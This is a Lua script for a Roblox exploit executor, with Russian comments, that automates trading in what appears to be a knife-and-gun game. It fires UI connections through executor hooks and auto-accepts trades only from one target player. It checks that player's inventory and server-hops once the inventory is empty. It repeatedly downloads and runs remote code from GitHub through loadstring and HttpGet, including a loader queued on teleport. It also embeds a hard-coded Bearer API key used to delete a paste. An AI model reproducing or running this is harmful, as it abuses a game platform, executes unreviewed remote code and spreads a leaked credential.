_G.gg = _G.gg or false
if _G.gg then
    print("already")
    return
end
_G.gg = true
repeat wait() until game:IsLoaded()
repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui") and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

function missing(t, f, fallback)
    if type(f) == t then return f end
    return fallback
end

queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))

print("PlayerGui и Humanoid загружены!")

local player = game:GetService("Players").LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

repeat
    wait(2)
    print("waiting")

    -- Проверяем, существует ли GUI и кнопка
    local playerGui = player:FindFirstChild("PlayerGui")
    if not playerGui then break end

    local deviceSelect = playerGui:FindFirstChild("DeviceSelect")
    if not deviceSelect then break end

    local container = deviceSelect:FindFirstChild("Container")
    if not container then break end

    local tablet = container:FindFirstChild("Tablet")
    if not tablet then break end

    local selectt = tablet:FindFirstChild("Button")
    if not selectt then
        print("selectt не найден, выходим из цикла")
        break
    end

    -- Если нашли кнопку, кликаем
    local connections = getconnections(selectt.MouseButton1Click)
    if connections and connections[1] then
        connections[1]:Fire()
    end

until not playerGui:FindFirstChild("DeviceSelect")

local targetName = getgenv().name
local function get_device_type()
    repeat wait(1) 
        print('waiting2')
    until player.PlayerGui:FindFirstChild("MainGUI")
    local maingui = game.Players.LocalPlayer.PlayerGui.MainGUI
    local lobbygui = maingui:FindFirstChild("Lobby")
    local MobileState = lobbygui and lobbygui:FindFirstChild("LeaderBar") ~= nil
    return MobileState and 'mobile' or 'tablet'
end

local DEVICE_TYPE = get_device_type()

game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(args)
    lastOfferTime = args.LastOffer
end)
local tradeGUI2 = playerGui:WaitForChild("TradeGUI")
local TDselect = DEVICE_TYPE == 'tablet' and tradeGUI2

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local TradeRemote = ReplicatedStorage:WaitForChild("Trade")

local container = TDselect:WaitForChild("Container")
-- Получаем кнопки
local actions = container:WaitForChild("Trade"):WaitForChild("Actions")
local acceptcon = actions:WaitForChild("Accept")

local function normalizeName(name)
    return string.gsub(name, "[()%[%]{}]", "")
end

local function checkTrade()
    local container = TDselect:FindFirstChild("Container")
    local tradeFrame = container and container:FindFirstChild("Trade")
    local theirOffer = tradeFrame and tradeFrame:FindFirstChild("TheirOffer")
    local usernameLabel = theirOffer and theirOffer:FindFirstChild("Username")

    if not usernameLabel then
        return
    end

    local usernameText = usernameLabel.Text
    local cleanName = normalizeName(usernameText)

    if cleanName ~= targetName then
        warn("ne v spiske")
        ReplicatedStorage:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
    else
        print("sus")
    end
end

TDselect:GetPropertyChangedSignal("Enabled"):Connect(function()
    if TDselect.Enabled then
        checkTrade()
    else
        print("финики закрыто.")
    end
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local PLACEHOLDERS = {
    Nikilis = true,
    PLAYER_NAME1 = true,
}

-- Получаем TradeRequest каждый раз ЗАНОВО
local function getTradeRequest()
    if DEVICE_TYPE ~= "tablet" then
        return nil
    end

    local playerGui = LocalPlayer:WaitForChild("PlayerGui")

    local ok, tradeRequest = pcall(function()
        return playerGui.MainGUI.Game.Leaderboard.Container:WaitForChild("TradeRequest", 50)
    end)

    if ok then
        return tradeRequest
    end

    return nil
end

local function waitForValidUsername(usernameLabel)
    while usernameLabel.Parent and PLACEHOLDERS[usernameLabel.Text] do
        usernameLabel:GetPropertyChangedSignal("Text"):Wait()
    end
    return usernameLabel.Text
end

local function tradeLoop()
    local TradeRequest = getTradeRequest()
    if not TradeRequest then return end

    while TradeRequest.Parent do
        -- ждём открытия трейда
        if not TradeRequest.Visible then
            TradeRequest:GetPropertyChangedSignal("Visible"):Wait()
        end

        local receiving = TradeRequest:FindFirstChild("ReceivingRequest")
        local usernameLabel = receiving and receiving:FindFirstChild("Username")

        if not usernameLabel then
            task.wait()
            continue
        end

        local username = waitForValidUsername(usernameLabel)

        if username == targetName then
            handleTrade(username)
        else
            print("Трейд от недоверенного игрока:", username)
        end

        -- ждём закрытия трейда, чтобы не зациклиться
        TradeRequest:GetPropertyChangedSignal("Visible"):Wait()
    end
end

task.spawn(tradeLoop)

offer = false

TDselect:GetPropertyChangedSignal("Enabled"):Connect(function()
    if TDselect.Enabled then
        local firstSlot = TDselect.Container.Trade.TheirOffer.Container.NewItem1
        repeat
            wait(0.7)
            if not TDselect.Enabled then
                print("трейд закрылся в логике офера")
                return
            end
        until firstSlot.Visible
        offer = true

        local cooldown = acceptcon:WaitForChild("Cooldown")

        repeat
            wait(0.5)
            if not TDselect.Enabled then
                print("трейд закрылся в логике кулдавна")
                offer = false
                return
            end
        until not cooldown.Visible
        offer = true

        print("cool")
        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferTime)
    else
        offer = false
        print("трейд гай закрылся")
    end
end)
local HttpService = game:GetService("HttpService")

local apiKey = "S3mWs7P1fzVUPTmcjjpvekjKO7N72sI0tZFgVx5N2FS92yCP6XkxniDX4mND"

local deleteUrl = "https://pastefy.app/api/v2/paste/" .. getgenv().paste

local headers = {
    Accept = "application/json",
    ["Content-Type"] = "application/json",
    ["Authorization"] = "Bearer " .. apiKey,
}

local function deletePaste()
    local req = {
        Url = deleteUrl,
        Method = "DELETE",
        Headers = headers,
    }

    local response = request(req)

    -- базовая проверка на наличие ответа
    if not response then 
        return false, "No response from request()"
    end

    -- логируем статус для дебага
    print(("HTTP %s %s"):format(response.StatusCode or "?", response.StatusMessage or ""))

    -- парсим тело ответа
    local parsed = nil
    if response.Body and response.Body ~= "" then
        local ok, res = pcall(function() 
            return HttpService:JSONDecode(response.Body)
        end)
        if ok then
            parsed = res
        else
            return false, ("Invalid JSON in response body: %s"):format(tostring(response.Body))
        end
    end

    -- проверяем успех удаления
    if parsed and parsed.success then
        print("Paste успешно удалена!")
        return true, parsed
    end

    -- иногда код 200/204 без parsed — считаем успехом
    if response.StatusCode == 200 or response.StatusCode == 204 then
        return true, parsed
    end

    -- неуспешный ответ
    local err = {
        status = response.StatusCode,
        statusMessage = response.StatusMessage,
        body = response.Body,
        successFlag = parsed and parsed.success or nil
    }
    return false, err
end

-- Функция для обработки трейда
function handleTrade(requesterName)
    local args = {}
    if requesterName == targetName then
        -- Наш игрок, принимаем трейд
        if TradeRemote:FindFirstChild("AcceptRequest") then
            TradeRemote.AcceptRequest:FireServer(unpack(args))
            print("Принят трейд от " .. requesterName)
        end
    else
        -- Не наш игрок, отклоняем трейд
        if TradeRemote:FindFirstChild("DeclineRequest") then
            TradeRemote.DeclineRequest:FireServer(unpack(args))
            print("Отклонен трейд от " .. requesterName)
        end
    end
end

game.Players.LocalPlayer.OnTeleport:Connect(function()
    if queueteleport then
        queueteleport("loadstring(game:HttpGet('https://github.com/Roma77799/testik/raw/refs/heads/main/test1',true))()")
    else
        print("queue нету")
    end
end)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Trade = ReplicatedStorage:WaitForChild("Trade")

task.spawn(function()
    local startTime = os.time()
    while true do
        wait(1.7)

        local success, status = pcall(function()
            return Trade.GetTradeStatus:InvokeServer()
        end)

        -- Если получили статус и он "StartTrade", сбрасываем таймер
        if success and status == "StartTrade" and offer == true then
            startTime = os.time()  -- трейд начался, обновляем таймер
        end

        -- Проверяем таймаут
        local now = os.time()
        if now - startTime >= 110 then
            print("❌ В течение 120 секунд статус не стал 'StartTrade'.")
            deletePaste()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop', true))()
            break
        end
    end
end)

-- Функция проверки
local function checkPlayer()
    print("слушаем наличие игрока")
    local targetPlayer = Players:FindFirstChild(targetName)

    if targetPlayer then
        print(targetName .. " найден в игре!")
    else
        print(targetName .. " не найден, вас кикают!")
        if LocalPlayer then
            print("Игрок " .. targetName .. " не найден в игре!")
            deletePaste()
            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop'),true))()
            return
        end
    end
end
local function checkInventory()
    print("Слушаем инвентарь")
    local args = { [1] = targetName }

    local success, result = pcall(function()
        return ReplicatedStorage:WaitForChild("Remotes")
            :WaitForChild("Extras")
            :WaitForChild("GetFullInventory")
            :InvokeServer(unpack(args))
    end)

    if not success or not result then
        warn("Не удалось получить инвентарь:", result)
        return
    end

    local weapons = result.Weapons or {}
    local owned = weapons.Owned or {}

    -- Проверяем, пустой ли инвентарь (нет оружия ИЛИ остались только дефолтные)
    local isOnlyDefault = true
    local hasAnyWeapon = next(owned) ~= nil

    if hasAnyWeapon then
        for weaponName in pairs(owned) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                isOnlyDefault = false
                break
            end
        end
    end

    if not hasAnyWeapon or isOnlyDefault then
        deletePaste()
        print("все пусто! (только дефолт остался)")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop", true))()
        return
    else
        print("Игрок имеет оружие!")
    end
end

print("Скрипт загружен")

task.spawn(function()
    while true do
        checkPlayer()
        checkInventory()
        wait(2)
    end
end)

